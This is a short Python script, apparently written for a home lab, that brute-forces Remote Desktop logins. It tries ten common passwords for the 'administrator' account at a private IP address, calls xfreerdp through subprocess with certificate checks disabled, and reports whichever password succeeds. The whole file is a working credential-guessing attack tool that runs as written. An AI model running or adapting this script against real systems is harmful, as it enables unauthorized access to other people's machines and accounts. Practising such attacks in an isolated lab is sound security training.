import subprocess
target_ip = "192.168.56.102"   # Replace with your Windows VM IP
username = "administrator"     # Replace with your Windows username

# Small wordlist of 10 passwords (customize as needed)
passwords = [
    "123456",
    "admin",
    "administrator",
    "password",
  "admin123",
    "test123",
    "welcome",
    "qwerty",
    "1234",
    "56789"
]

print(f"[*] Starting brute-force on {target_ip} with username '{username}'...\n")

for attempt, password in enumerate(passwords, 1):
    print(f"[{attempt}/10] Trying password: {password}")
    try:
        result = subprocess.run(
            ["xfreerdp", f"/v:{target_ip}", f"/u:{username}", f"/p:{password}", "/cert:ignore"],
            capture_output=True,
            text=True,
            timeout=10
        )

        if "Authentication only, exit status 0" in result.stderr or result.returncode == 0:
            print(f"\n[+] SUCCESS! Password found: {password}")
            break
        else:
            print("[-] Failed.")

    except subprocess.TimeoutExpired:
        print("[!] Timeout, skipping...")
    except Exception as e:
        print(f"[!] Error: {e}")
else:
    print("\n[-] Tried all 10 passwords. No match found.")
